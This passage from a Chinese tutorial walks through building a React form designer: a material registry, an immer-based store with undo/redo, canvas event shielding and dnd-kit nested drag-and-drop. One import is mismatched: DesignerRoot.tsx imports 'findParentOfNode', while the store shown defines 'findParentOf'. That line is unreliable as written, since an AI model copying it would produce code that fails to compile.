│ ▣ 分组(容器)  │                                │  生成，见路线5）│
│              │   ── 点击空白取消选中 ──          │              │
└──────────────┴────────────────────────────────┴──────────────┘
     │ ① 拖入：insertNode(容器, 新节点)        ▲ ⑤ setter 改值：
     │    产生 immer 补丁进历史                 │    updateProps(节点, 属性, 值)
     ▼                                        │    （补丁按 mergeKey 合并，见路线7）
┌─────────────────────────────────────────────┴──────────────┐
│                  EditorStore（唯一数据源）                     │
│   schema 树 + selectedId + mode + past/future（undo 历史）     │
└──────────┬──────────────────────────────┬───────────────────┘
           │ ② 订阅 schema（树引用变了才重渲染） │ ④ 订阅 selectedId
           ▼                              ▼
      Canvas 重渲染                   PropsPanel 重渲染
           │ ③ 预览/导出时：EditorNode 树 → FormSchema（第 2 章协议）
           ▼
      第 2 章渲染器跑起来（设计器↔渲染器闭环）
```

数据流一句话总结：**一切编辑动作（拖入/删除/排序/改属性）都是对 EditorStore 中 schema 树的一次 produce 更新，三栏全部通过订阅这个 store 驱动；画布和属性面板不持有任何自己的状态。** 这个"单一数据源"纪律是后面 undo/redo 能全局生效的前提——历史记录的是 store 的补丁，任何绕过 store 的直改 DOM 都是历史管不到的盲区。

注意图里的第 ③ 步：设计器内部的树（`EditorNode`）和渲染器消费的协议（第 2 章 `FormSchema`）是**两种 schema**——前者带 id/children/组件名（为编辑服务），后者是字段声明（为渲染服务），预览/导出时做一次 `toFormSchema` 转换。别试图用一份协议同时伺候两个主人，那会让两边都变得难看。

### 实现路线

路线 1→8 的依赖关系：物料协议（1）定义"有什么可拖"，画布（2）定义"拖到哪、怎么选中"，拖拽（3）打通"怎么进去、怎么排"，选中态（4）是编辑的视觉反馈，Setter（5）是"改属性"的主通道，快捷键（6）与 undo/redo（7）建立安全网，预览导入导出（8）收口闭环。其中 3 的嵌套容器和 5 的自举是两处硬骨头，时间分配上各留足 3 天。

#### 1. **物料协议**：`{ name, label, icon, defaultProps, setters, isContainer? }`，注册进物料库

**是什么**：物料协议描述"一种可拖入画布的组件"的全部元信息——它叫什么、拖进去长什么样、属性面板该怎么配置它。

**为什么需要**：画布渲染要知道组件名对应的预览，拖入要知道初始 props，属性面板要知道有哪些可配置项。这三样信息如果散落在各处（组件文件里一份、面板文件里一份），加物料就要改 N 个文件；收拢成一份 `MaterialMeta` 注册进物料库，加物料 = 加一个注册项。这正是底座 1.2 注册表模式的进阶：注册的不只是组件，是组件 + 它的编辑器生态（setters）。

**怎么做**：完整类型与注册表：

```ts
// designer/materials/types.ts
import type { ReactNode } from 'react'
import type { OptionItem } from '../../chapter2/types'

/** Setter 的种类：本质是"属性面板这张表单的字段类型"（复用第 2 章 FieldType 思想） */
export type SetterKind =
  | 'text'        // 单行文本
  | 'textarea'    // 多行文本
  | 'number'      // 数字
  | 'switch'      // 布尔开关
  | 'select'      // 单选（候选来自 setterProps.options）
  | 'options'     // 选项编辑器（编辑下拉候选，自定义 widget）
  | 'expression'  // 表达式编辑（联动条件，自定义 widget）

export interface SetterDecl {
  /** 对应物料 props 的键名，如 'label' / 'placeholder' / 'required' */
  prop: string
  label: string
  setter: SetterKind
  /** Setter 的额外配置：select 的候选、number 的 min/max、占位符等 */
  setterProps?: {
    options?: OptionItem[]
    placeholder?: string
    min?: number
    max?: number
  }
  /** 该属性在面板里的显隐条件（表达式求值上下文是 props，如 "required == true"） */
  visibleWhen?: string
  defaultValue?: unknown
}

export interface MaterialMeta {
  /** 物料唯一名，等于 EditorNode.componentName */
  name: string
  /** 物料区与画布角标上显示的中文名 */
  label: string
  icon: ReactNode
  /** 容器物料：可接收子节点（分组），画布上高亮投放区 */
  isContainer?: boolean
  /** 拖入画布时的初始 props（必含渲染器需要的字段配置） */
  defaultProps: Record<string, unknown>
  /** 属性面板的声明：它决定了属性面板长什么样（见路线 5 的自举） */
  setters: SetterDecl[]
}
```

```ts
// designer/materials/registry.ts
import type { MaterialMeta } from './types'

export const materialRegistry: Record<string, MaterialMeta> = {
  input: {
    name: 'input',
    label: '单行输入',
    icon: '▭',
    defaultProps: { label: '单行输入', placeholder: '请输入', required: false },
    setters: [
      { prop: 'label', label: '标题', setter: 'text' },
      { prop: 'placeholder', label: '占位提示', setter: 'text', setterProps: { placeholder: '输入框内的灰色提示' } },
      { prop: 'required', label: '必填', setter: 'switch', defaultValue: false },
      { prop: 'maxLength', label: '最大长度', setter: 'number', setterProps: { min: 0 } },
      { prop: 'visibleWhen', label: '显隐条件', setter: 'expression', setterProps: { placeholder: "如 $form.userType == 'company'" } },
    ],
  },
  select: {
    name: 'select',
    label: '下拉选择',
    icon: '▾',
    defaultProps: { label: '下拉选择', required: false, options: [{ label: '选项一', value: 'opt1' }] },
    setters: [
      { prop: 'label', label: '标题', setter: 'text' },
      { prop: 'required', label: '必填', setter: 'switch' },
      { prop: 'options', label: '候选选项', setter: 'options' },
    ],
  },
  number: {
    name: 'number',
    label: '数字输入',
    icon: '№',
    defaultProps: { label: '数字输入', required: false, min: 0, max: 100 },
    setters: [
      { prop: 'label', label: '标题', setter: 'text' },
      { prop: 'required', label: '必填', setter: 'switch' },
      { prop: 'min', label: '最小值', setter: 'number' },
      { prop: 'max', label: '最大值', setter: 'number' },
    ],
  },
  switch: {
    name: 'switch',
    label: '开关',
    icon: '◠',
    defaultProps: { label: '开关', required: false },
    setters: [
      { prop: 'label', label: '标题', setter: 'text' },
      { prop: 'required', label: '必填', setter: 'switch' },
    ],
  },
  textarea: {
    name: 'textarea',
    label: '多行输入',
    icon: '▤',
    defaultProps: { label: '多行输入', placeholder: '请输入', required: false },
    setters: [
      { prop: 'label', label: '标题', setter: 'text' },
      { prop: 'placeholder', label: '占位提示', setter: 'text' },
      { prop: 'required', label: '必填', setter: 'switch' },
    ],
  },
  section: {
    name: 'section',
    label: '分组',
    icon: '❐',
    isContainer: true,
    defaultProps: { label: '分组标题' },
    setters: [{ prop: 'label', label: '分组标题', setter: 'text' }],
  },
}
```

拖入时"从物料实例化一个节点"的工厂：

```ts
// designer/materials/createNode.ts
export interface EditorNode {
  /** 节点稳定 id：React key、拖拽 id、选中定位全靠它，创建后永不改变 */
  id: string
  componentName: string
  props: Record<string, unknown>
  children?: EditorNode[]
}

export function createNodeFromMaterial(meta: MaterialMeta): EditorNode {
  const node: EditorNode = {
    id: globalThis.crypto.randomUUID(),
    componentName: meta.name,
    props: structuredClone(meta.defaultProps),   // 深拷贝！否则两个节点的数组型 props（如 options）共享引用
  }
  if (meta.isContainer) node.children = []
  return node
}
```

**常见坑（症状 → 根因 → 修法）**：症状——拖两个"下拉选择"进画布，在 A 上编辑候选选项，B 的选项也变了。根因——`defaultProps` 里的 `options` 数组是引用类型，`createNode` 时浅拷贝（或直接 `props: meta.defaultProps`），两节点共享同一数组。修法——实例化必须 `structuredClone`（上面代码已做）；物料注册表本身也永不允许被运行时修改。

#### 2. 画布 = schema 树 + 递归渲染；**编辑模式下子组件 `pointer-events: none`**，画布统一接管点击做选中（否则会触发组件自身行为）

**是什么**：画布把 EditorNode 树递归渲染出来（复用底座 1.3），编辑模式下所有组件内容被剥夺交互能力（`pointer-events: none`），点击、拖拽、选中全部由每个节点外层的"壳"统一接管。

**为什么需要**：画布上渲染的是真实组件——select 会被点开下拉、date 会弹日历、带链接的物料会跳页。设计器要的是"点它 = 选中它"，绝不是"点它 = 使用它"。两道防线：`pointer-events: none` 让子组件收不到任何指针事件（治本）；事件捕获阶段拦截兜底（治漏网：键盘焦点、第三方库挂在 document 上的监听）。

先看 EditorStore——三栏共同的唯一数据源（含 undo 历史骨架，路线 7 详述合并机制）：

```ts
// designer/store.ts
import { create } from 'zustand'
import { enablePatches, produce, produceWithPatches, applyPatches, type Patch } from 'immer'
import type { EditorNode } from './materials/createNode'

enablePatches()   // immer v9+：必须显式开启，produceWithPatches 才会生成正/反补丁

export interface HistoryEntry {
  patches: Patch[]
  inversePatches: Patch[]
  /** 同一 mergeKey 且 300ms 内的操作合并为一条历史（setter 连续输入的关键，见路线 7） */
  mergeKey?: string
  at: number
}

export type EditorMode = 'edit' | 'preview'

export interface EditorState {
  schema: EditorNode                       // 根节点：{ id: 'root', componentName: 'FormRoot', children: [...] }
  selectedId: string | null
  mode: EditorMode
  past: HistoryEntry[]
  future: HistoryEntry[]

  select(id: string | null): void
  setMode(m: EditorMode): void
  insertNode(containerId: string, node: EditorNode, index?: number): void
  removeNode(id: string): void
  duplicateNode(id: string): void
  moveNodeByStep(id: string, dir: -1 | 1): void
  moveNodeByDrag(id: string, containerId: string, index: number): void
  updateProps(id: string, propPath: string, value: unknown, mergeKey?: string): void
  undo(): void
  redo(): void
}

/** 树查找工具：全库唯一入口，保证查找语义一致 */
export function findNode(root: EditorNode, id: string): EditorNode | undefined {
  if (root.id === id) return root
  for (const c of root.children ?? []) {
    const hit = findNode(c, id)
    if (hit) return hit
  }
  return undefined
}
export function findParentOf(root: EditorNode, id: string): EditorNode | undefined {
  for (const c of root.children ?? []) {
    if (c.id === id) return root
    const hit = findParentOf(c, id)
    if (hit) return hit
  }
  return undefined
}
function isDescendant(root: EditorNode, ancestorId: string, maybeChildId: string): boolean {
  const anc = findNode(root, ancestorId)
  return !!anc && !!findNode(anc, maybeChildId) && maybeChildId !== ancestorId
}

export const useEditorStore = create<EditorState>()((set, get) => {
  /**
   * 所有结构变更的统一出口：mutate 走 produceWithPatches，补丁进历史栈。
   * mergeKey 语义见路线 7——同 key 且 300ms 内的补丁合并成一条，撤销时不逐字符回退。
   */
  const mutate = (mergeKey: string | undefined, mutator: (d: EditorState) => void) =>
    set((state) => {
      const [next, patches, inversePatches] = produceWithPatches(state, (d) => {
        mutator(d as EditorState)
      })
      if (patches.length === 0) return state          // 无实际变化：不进历史，也不触发更新
      const now = Date.now()
      const past = [...state.past]
      const last = past[past.length - 1]
      if (mergeKey && last && last.mergeKey === mergeKey && now - last.at < 300) {
        // 合并进最后一条：
        // 正补丁按发生顺序追加（redo 时依序 apply）
        // 逆补丁必须"新的排前面"（undo 时先回滚最近的编辑，applyPatches 按数组顺序执行）
        past[past.length - 1] = {
          mergeKey,
          at: now,
          patches: [...last.patches, ...patches],
          inversePatches: [...inversePatches, ...last.inversePatches],
        }
      } else {
        past.push({ patches, inversePatches, mergeKey, at: now })
      }
      return { ...next, past, future: [] }            // 产生新操作时清空 redo 栈
    })

  return {
    schema: { id: 'root', componentName: 'FormRoot', props: {}, children: [] },
    selectedId: null,
    mode: 'edit',
    past: [],
    future: [],

    select: (id) => set({ selectedId: id }),
    setMode: (m) => set({ mode: m }),

    insertNode: (containerId, node, index) =>
      mutate(undefined, (d) => {
        const container = findNode(d.schema, containerId)
        if (!container) return
        container.children ??= []
        if (index == null || index < 0 || index > container.children.length) {
          container.children.push(node)
        } else {
          container.children.splice(index, 0, node)
        }
        d.selectedId = node.id      // 拖入即选中，属性面板立刻就位
      }),

    removeNode: (id) =>
      mutate(undefined, (d) => {
        const parent = findParentOf(d.schema, id)
        if (!parent?.children) return
        const i = parent.children.findIndex((c) => c.id === id)
        if (i >= 0) parent.children.splice(i, 1)
        if (d.selectedId === id) d.selectedId = null
      }),

    duplicateNode: (id) =>
      mutate(undefined, (d) => {
        const parent = findParentOf(d.schema, id)
        const src = findNode(d.schema, id)
        if (!parent?.children || !src) return
        // 深拷贝 + 全部换新 id（子树递归换），否则 key/拖拽 id 冲突
        const clone = reassignIds(structuredClone(src))
        const i = parent.children.findIndex((c) => c.id === id)
        parent.children.splice(i + 1, 0, clone)
        d.selectedId = clone.id
      }),

    moveNodeByStep: (id, dir) =>
      mutate(undefined, (d) => {
        const parent = findParentOf(d.schema, id)
        if (!parent?.children) return
        const i = parent.children.findIndex((c) => c.id === id)
        const j = i + dir
        if (i < 0 || j < 0 || j >= parent.children.length) return
        const [moved] = parent.children.splice(i, 1)
        parent.children.splice(j, 0, moved)
      }),

    moveNodeByDrag: (id, containerId, index) =>
      mutate(undefined, (d) => {
        // 守卫：容器不能拖进自己的子树（自己套自己）
        if (isDescendant(d.schema, id, containerId)) return
        const oldParent = findParentOf(d.schema, id)
        if (!oldParent?.children) return
        const i = oldParent.children.findIndex((c) => c.id === id)
        if (i < 0) return
        const [moved] = oldParent.children.splice(i, 1)
        const container = findNode(d.schema, containerId)
        if (!container) return
        container.children ??= []
        let j = index
        if (oldParent.id === containerId && i < index) j -= 1   // 同容器后移：删除后索引前移了一位
        if (j < 0 || j > container.children.length) j = container.children.length
        container.children.splice(j, 0, moved)
      }),

    updateProps: (id, propPath, value, mergeKey) =>
      mutate(mergeKey, (d) => {
        const node = findNode(d.schema, id)
        if (node) setPathOnProps(node.props, propPath, value)
      }),

    undo: () =>
      set((s) => {
        const last = s.past[s.past.length - 1]
        if (!last) return s
        return {
          ...applyPatches(s, last.inversePatches),
          past: s.past.slice(0, -1),
          future: [last, ...s.future],
        }
      }),

    redo: () =>
      set((s) => {
        const [nextEntry, ...rest] = s.future
        if (!nextEntry) return s
        return {
          ...applyPatches(s, nextEntry.patches),
          past: [...s.past, nextEntry],
          future: rest,
        }
      }),
  }
})

/** 深拷贝子树时给每个节点换新 id（duplicateNode 用） */
function reassignIds(node: EditorNode): EditorNode {
  const clone: EditorNode = { ...node, id: globalThis.crypto.randomUUID() }
  if (node.children) clone.children = node.children.map(reassignIds)
  return clone
}

/** props 按点路径写值（结构简单，一层/两层足够；实现同第 2 章 setPath） */
function setPathOnProps(root: Record<string, unknown>, path: string, value: unknown): void {
  const keys = path.split('.')
  const last = keys.pop()!
  let cur: Record<string, unknown> = root
  for (const k of keys) {
    if (cur[k] == null || typeof cur[k] !== 'object') cur[k] = {}
    cur = cur[k] as Record<string, unknown>
  }
  cur[last] = value
}
```

关键设计决策两个：**patches 以整个 EditorState 为基**（mutator 改 `d.schema`，补丁路径形如 `['schema','children',0,...]`），undo/redo 直接 `applyPatches(state, ...)`，不需要额外的"还原映射"；**`select`/`setMode` 不进历史**——选中态不是文档内容，撤销选中会让用户困惑（Cmd+Z 应该撤的是结构/属性变化）。

画布与"编辑壳"。完整代码与原理：

```tsx
// designer/canvas/Canvas.tsx
import { useEditorStore } from '../store'
import { CanvasTree } from './CanvasTree'

export function Canvas() {
  const schema = useEditorStore((s) => s.schema)
  const mode = useEditorStore((s) => s.mode)
  const select = useEditorStore((s) => s.select)
  const editing = mode === 'edit'

  return (
    <div
      className={'canvas' + (editing ? ' canvas--editing' : '')}
      // 兜底拦截第 2 层：键盘事件在捕获阶段截停，防止焦点残留在组件里时被 Tab/回车触发其内部行为
      onKeyDownCapture={editing ? (e) => e.stopPropagation() : undefined}
      // 点击画布空白（target 是画布自身）→ 取消选中
      onPointerDown={(e) => {
        if (editing && e.target === e.currentTarget) select(null)
      }}
    >
      {editing ? (
        // 第 1 层防线：整个内容树 pointer-events:none——子组件一个指针事件都收不到。
        // 注意 pointer-events 是"继承式"属性，EditableShell 的遮罩层会显式改回 auto（见 EditableShell）
        <div style={{ pointerEvents: 'none' }}>
          <CanvasTree node={schema} />
        </div>
      ) : (
        // 预览模式：去掉 none 包装、EditableShell 也不再渲染遮罩/操作条，交互归还组件本身。
        // （完整可提交的预览走路线 8 的 PreviewPanel——那才是第 2 章渲染器）
        <CanvasTree node={schema} />
      )}
    </div>
  )
}
```

```tsx
// designer/canvas/CanvasTree.tsx —— 递归渲染（复用底座 1.3 的 renderNode 思路）
import { materialRegistry } from '../materials/registry'
import { EditableShell } from './EditableShell'
import { ContainerDropZone } from './ContainerDropZone'
import { WidgetPreview } from './WidgetPreview'
import { SortableArea } from './SortableArea'
import type { EditorNode } from '../materials/createNode'

export function CanvasTree({ node }: { node: EditorNode }) {
  const children = node.children ?? []
  return (
    <ContainerDropZone node={node}>
      <SortableArea ids={children.map((c) => c.id)}>
        {children.map((child) => (
          <CanvasNode key={child.id} node={child} />   // key 用节点 id，绝不用 index（底座 1.3 铁律）
        ))}
      </SortableArea>
    </ContainerDropZone>
  )
}

function CanvasNode({ node }: { node: EditorNode }) {
  const meta = materialRegistry[node.componentName]
  if (meta?.isContainer) {
    return (
      <EditableShell node={node}>
        <CanvasTree node={node} />
      </EditableShell>
    )
  }
  return (
    <EditableShell node={node}>
      <WidgetPreview node={node} />
    </EditableShell>
  )
}
```

**原理拆解：两道防线各挡什么**。

第 1 层 `pointer-events: none`（治本）：CSS 的 `pointer-events` 是继承属性，画布内容容器设 none 后，整棵子树的元素都不再是"命中目标"——点击会穿透它们落到上层（EditableShell 的遮罩）。子组件无论内部怎么监听 click，事件根本不会派发给它。**但它只挡指针事件**，键盘（Tab 聚焦后按回车打开 select）、程序性 focus、以及第三方组件弹到 body 的 portal（不在画布 DOM 子树内，inherit 不生效）管不到——所以需要第 2 层。

第 2 层捕获拦截（兜底）：`onKeyDownCapture` 在捕获阶段（事件从根向目标传播时）截停键盘事件，子组件的 bubble 监听永远收不到。对 portal 弹层的治理是模式问题：编辑模式下物料预览应选择"无交互版本"（我们渲染 `WidgetPreview` 而不是真组件，天然无弹层）；如果物料预览必须用真组件，需要在编辑模式给它传"禁止打开弹层"的 props——这也是为什么物料预览独立成组件而不是直接复用第 2 章 widget。

```tsx
// designer/canvas/WidgetPreview.tsx —— 编辑模式专用的" inert 预览"
import type { EditorNode } from '../materials/createNode'

export function WidgetPreview({ node }: { node: EditorNode }) {
  const p = node.props
  switch (node.componentName) {
    case 'input':
      return (
        <div className="preview">
          <span className="preview__label">{String(p.label ?? '')}{p.required ? ' *' : ''}</span>
          <input placeholder={String(p.placeholder ?? '')} readOnly aria-readonly />
        </div>
      )
    case 'textarea':
      return (
        <div className="preview">
          <span className="preview__label">{String(p.label ?? '')}{p.required ? ' *' : ''}</span>
          <textarea placeholder={String(p.placeholder ?? '')} readOnly />
        </div>
      )
    case 'select': {
      const options = Array.isArray(p.options) ? p.options : []
      return (
        <div className="preview">
          <span className="preview__label">{String(p.label ?? '')}{p.required ? ' *' : ''}</span>
          <select>
            {options.map((o, i) => (
              <option key={i}>{String((o as { label?: string }).label ?? '')}</option>
            ))}
          </select>
        </div>
      )
    }
    case 'number':
      return (
        <div className="preview">
          <span className="preview__label">{String(p.label ?? '')}{p.required ? ' *' : ''}</span>
          <input type="number" readOnly />
        </div>
      )
    case 'switch':
      return (
        <div className="preview">
          <span className="preview__label">{String(p.label ?? '')}</span>
          <input type="checkbox" readOnly />
        </div>
      )
    default:
      return <div className="preview preview--unknown">未知物料：{node.componentName}</div>
  }
}
```

**常见坑（症状 → 根因 → 修法）**：症状——画布上点选"下拉选择"物料，下拉竟然弹开了，且选中态没触发。根因——`pointer-events: none` 加在了错误的层（比如加在了画布根而不是内容包裹层），或者某个组件用 portal 把真实交互 DOM 挂到了 body。修法——检查 none 的生效范围（DevTools 元素面板勾选 :hov 看 computed pointer-events）；portal 类组件（Select/DatePicker/Tooltip）在编辑模式换 inert 预览（本节 WidgetPreview 方案）或传"禁弹层"props；确认遮罩层显式 `pointerEvents: 'auto'`（下一节 EditableShell）。

#### 3. 拖拽（dnd-kit）：

设计器有三种语义不同的拖放，一套 DndContext 全搞定，但每种的目标解析不同，先列清楚再上代码：

| 拖放 | 拖起方（active） | 落点（over） | 语义 |
|---|---|---|---|
| 物料区 → 画布 | 物料项 `material:xxx` | 容器投放区或任意节点 | 新建节点插入 schema |
| 画布内排序 | 节点（useSortable） | 兄弟节点 | 同容器内 arrayMove |
| 跨/嵌套容器移动 | 节点（useSortable） | 容器投放区或节点 | 摘出再插入目标容器 |

   - 物料区 → 画布：拖入 = 向 schema 插入节点（目标 droppable = 各容器节点）

物料区每项是 draggable，画布上每个容器是 droppable，画布上每个节点（叶子）经 useSortable 也自动注册成 droppable——所以"拖到节点上"应理解为"插到它前面"，"拖到容器空白"是"追加到容器末尾"：

```tsx
// designer/panels/MaterialPanel.tsx
import { useDraggable } from '@dnd-kit/core'
import { materialRegistry } from '../materials/registry'
import type { MaterialMeta } from '../materials/types'

function MaterialItem({ meta }: { meta: MaterialMeta }) {
  const { setNodeRef, listeners, isDragging } = useDraggable({
    id: `material:${meta.name}`,
    data: { kind: 'material', meta },   // data 随拖拽携带，onDragEnd 里取回
  })
  return (
    <div
      ref={setNodeRef}
      {...listeners}
      className={'material-item' + (isDragging ? ' material-item--dragging' : '')}
    >
      <span className="material-item__icon">{meta.icon}</span>
      <span>{meta.label}</span>
    </div>
  )
}

export function MaterialPanel() {
  return (
    <aside className="material-panel">
      <h3>物料</h3>
      {Object.values(materialRegistry).map((m) => (
        <MaterialItem key={m.name} meta={m} />
      ))}
    </aside>
  )
}
```

```tsx
// designer/canvas/ContainerDropZone.tsx —— 容器投放区（空容器也能接收拖放的关键）
import { useDroppable } from '@dnd-kit/core'
import type { EditorNode } from '../materials/createNode'

export function ContainerDropZone({ node, children }: { node: EditorNode; children?: React.ReactNode }) {
  const { setNodeRef, isOver } = useDroppable({
    id: `container:${node.id}`,
    data: { kind: 'container', containerId: node.id },
  })
  const empty = !(node.children ?? []).length
  return (
    <div
      ref={setNodeRef}
      className={'drop-zone' + (isOver ? ' drop-zone--over' : '') + (empty ? ' drop-zone--empty' : '')}
    >
      {children}
      {empty && <div className="drop-zone__hint">拖入组件到这里</div>}
    </div>
  )
}
```

为什么容器要独立 droppable：SortableContext 只对 items 里的节点生效，**空容器没有任何 sortable 项**，没有独立 droppable 就无法接收任何拖放——"空分组拖不进东西"是新手实现最常见的断路。

   - 画布内排序：`useSortable`

```tsx
// designer/canvas/SortableArea.tsx
import { SortableContext, verticalListSortingStrategy } from '@dnd-kit/sortable'

export function SortableArea({ ids, children }: { ids: string[]; children: React.ReactNode }) {
  return (
    <SortableContext items={ids} strategy={verticalListSortingStrategy}>
      {children}
    </SortableContext>
  )
}
```

EditableShell 里每个节点挂 useSortable（拖起手柄就是遮罩层本身）：

```tsx
// designer/canvas/EditableShell.tsx —— 节点编辑壳：sortable + 选中 + 遮罩（选中态 UI 细节在路线 4）
import { memo } from 'react'
import { useSortable } from '@dnd-kit/sortable'
import { CSS } from '@dnd-kit/utilities'
import { useEditorStore } from '../store'
import { materialRegistry } from '../materials/registry'
import type { EditorNode } from '../materials/createNode'

export const EditableShell = memo(function EditableShell({
  node,
  children,
}: {
  node: EditorNode
  children: React.ReactNode
}) {
  const selected = useEditorStore((s) => s.selectedId === node.id)   // 布尔订阅：只有新旧选中两个节点会重渲染
  const select = useEditorStore((s) => s.select)
  const editing = useEditorStore((s) => s.mode === 'edit')

  const { attributes, listeners, setNodeRef, setActivatorNodeRef, transform, transition, isDragging } =
    useSortable({ id: node.id, data: { kind: 'node' } })

  return (
    <div
      ref={setNodeRef}
      className={'editable-node' + (selected ? ' editable-node--selected' : '') + (isDragging ? ' editable-node--dragging' : '')}
      style={{ transform: CSS.Transform.toString(transform), transition }}
    >
      {/* 组件内容：编辑模式不吃指针事件（路线 2 的第 1 层防线在此处落地） */}
      <div className="editable-node__content">{children}</div>

      {/* 遮罩层：仅编辑模式渲染，显式恢复 pointer-events，接管本节点的点击/拖拽 */}
      {editing && (
        <div
          ref={setActivatorNodeRef}
          className="editable-node__mask"
          style={{ pointerEvents: 'auto' }}
          {...attributes}
          {...listeners}
          onPointerDown={(e) => {
            select(node.id)          // 按下即选中
            listeners?.onPointerDown?.(e)   // 同时交给 dnd-kit 判定是否启动拖拽（有 4px 启动距离）
          }}
        />
      )}
    </div>
  )
})
```

启动距离的配置在 DndContext 的 sensor 里（见下方总装代码）：`activationConstraint: { distance: 4 }` 表示按下后移动超 4px 才算拖拽，否则视为点击——**这是"点击选中"与"拖拽排序"共存的关键**，没有这个约束，单击会立刻进入拖拽态、遮罩上的 select 反而抖动。

   - 嵌套容器拖放：**`pointerWithin` + `closestCorners` 组合碰撞策略**（本章最大坑）

**症状先行**：嵌套容器（分组里套分组）场景，把节点拖进内层容器，它总是落到外层容器；或拖到两容器交界处，落点反复横跳。**根因**：默认的 `closestCenter` 策略比的是"活动元素中心到各 droppable 中心的距离"——外层容器面积大、中心可能在物理上更近，即使指针明明落在内层容器里，判定仍可能选外层。**修法**：优先用"指针物理命中"（pointerWithin），命中多个（嵌套时父子容器同时命中）时取面积最小的（最内层）；指针不在任何容器内（间隙、外侧）时退回 closestCorners 保持响应。图解：

```text
┌── 容器 A（外层）─────────────────────────────┐
│  [节点1]     ┌── 容器 B（内层）──────────┐    │
│              │        ✋ 指针在这里       │    │
│              └───────────────────────────┘    │
└──────────────────────────────────────────────┘

closestCenter：比较"活动元素中心 ↔ 各容器中心"的距离
              → A 中心可能反而更近 → 误判放进 A（错误）
pointerWithin：指针物理上同时在 A 和 B 内 → 命中集合 {A, B}
              → 取面积最小者 B → 放进 B（符合直觉）
指针在容器间隙：pointerWithin 命中为空 → 兜底 closestCorners → 贴最近的容器
```

```ts
// designer/canvas/collision.ts —— 组合碰撞策略 + 最内层优先
import {
  pointerWithin,
  closestCorners,
  type CollisionDetection,
} from '@dnd-kit/core'

export const nestedCollisionDetection: CollisionDetection = (args) => {
  // 第 1 优先：指针物理命中的 droppable
  const hits = pointerWithin(args)
  if (hits.length === 0) {
    // 第 2 优先：间隙/外侧时按四角最近距离兜底，拖拽仍然"有感知"
    return closestCorners(args)
  }
  if (hits.length === 1) return hits
  // 嵌套时父子同时命中：按命中矩形面积升序 = 最内层容器优先
  // droppableRects 是参与碰撞判定的各 droppable 当前矩形（dnd-kit 维护）
  const area = (id: string | number): number => {
    const rect = args.droppableRects.get(id)
    return rect ? rect.width * rect.height : Number.MAX_SAFE_INTEGER
  }
  return [...hits].sort((a, b) => area(a.id) - area(b.id))
}
```

DndContext 总装（三种拖放的 onDragEnd 统一解析）：

```tsx
// designer/DesignerRoot.tsx
import { useState } from 'react'
import {
  DndContext,
  DragOverlay,
  PointerSensor,
  KeyboardSensor,
  useSensor,
  useSensors,
  type DragEndEvent,
  type DragStartEvent,
} from '@dnd-kit/core'
import { sortableKeyboardCoordinates } from '@dnd-kit/sortable'
import { useEditorStore, findParentOfNode, findNode } from './store'
import { materialRegistry } from './materials/registry'
import { createNodeFromMaterial } from './materials/createNode'
import { nestedCollisionDetection } from './canvas/collision'
import { MaterialPanel } from './panels/MaterialPanel'
import { Canvas } from './canvas/Canvas'
import { PropsPanel } from './panels/PropsPanel'

export function DesignerRoot() {
  const schema = useEditorStore((s) => s.schema)
  const insertNode = useEditorStore((s) => s.insertNode)
  const moveNodeByDrag = useEditorStore((s) => s.moveNodeByDrag)
  const [activeKind, setActiveKind] = useState<'material' | 'node' | null>(null)
  const [activeLabel, setActiveLabel] = useState('')

  // 4px 启动距离：区分"点击选中"与"拖拽"；KeyboardSensor 配 sortable 键盘坐标算法保证无障碍
  const sensors = useSensors(
    useSensor(PointerSensor, { activationConstraint: { distance: 4 } }),
    useSensor(KeyboardSensor, { coordinateGetter: sortableKeyboardCoordinates }),
  )

  const onDragStart = (e: DragStartEvent) => {
    const data = e.active.data.current
    if (data?.kind === 'material') {
      setActiveKind('material')
      setActiveLabel(data.meta.label as string)
    } else if (data?.kind === 'node') {
      setActiveKind('node')
      // 节点拖拽的 data 里只有 kind，具体节点信息按 id 回查 schema
      const n = findNode(useEditorStore.getState().schema, String(e.active.id))
      setActiveLabel(materialRegistry[n?.componentName ?? '']?.label ?? '节点')
    }
  }

  const onDragEnd = ({ active, over }: DragEndEvent) => {
    setActiveKind(null)
    if (!over) return
    const a = active.data.current
    const o = over.data.current
    const state = useEditorStore.getState()

    // ① 物料区 → 画布：over 是容器 → 追加；over 是节点 → 插到它前面
    if (a?.kind === 'material') {
      if (o?.kind === 'container') {
        insertNode(o.containerId, createNodeFromMaterial(a.meta))
      } else if (o?.kind === 'node') {
        const parent = findParentOfNode(state.schema, String(over.id))
        if (parent) {
          const i = (parent.children ?? []).findIndex((c) => c.id === over.id)
          insertNode(parent.id, createNodeFromMaterial(a.meta), i >= 0 ? i : undefined)
        }
      }
      return
    }

    // ②③ 画布内排序 / 跨容器移动：over 是容器 → 追加；over 是节点 → 落到其父容器对应位置
    if (a?.kind === 'node') {
      const dragId = String(active.id)
      if (o?.kind === 'container') {
        moveNodeByDrag(dragId, o.containerId, -1)   // -1 = 追加到末尾
      } else if (o?.kind === 'node') {
        const parent = findParentOfNode(state.schema, String(over.id))
        if (parent) {
          const i = (parent.children ?? []).findIndex((c) => c.id === over.id)
          moveNodeByDrag(dragId, parent.id, i >= 0 ? i : -1)
        }
      }
    }
  }

  return (
    <div className="designer">
      <DndContext
        sensors={sensors}
        collisionDetection={nestedCollisionDetection}
        onDragStart={onDragStart}
        onDragEnd={onDragEnd}
        onDragCancel={() => setActiveKind(null)}
      >
        <MaterialPanel />
        <Canvas />
        <PropsPanel />
        {/* 替身预览：拖动时原节点保持原位（只是降透明度），预览层跟随指针 */}
        <DragOverlay>
          {activeKind ? (
            <div className="drag-overlay-chip">{activeLabel}</div>
          ) : null}
        </DragOverlay>
      </DndContext>
    </div>
  )
}
```

排序语义的补充：上面 ② 里 over 是节点时取"该节点在其父容器中的 index"作为插入位。这与 SortableContext + arrayMove 的经典写法（直接对 items 数组 `arrayMove(ids, oldIndex, newIndex)`）效果等价——我们的 items 就是 schema 的 children，`moveNodeByDrag` 内部做的就是"摘出 + 按修正后的索引插回"（同容器时 `i < index` 先减一），语义与 arrayMove 一致，同时天然支持跨容器。

   - 拖动预览用 DragOverlay

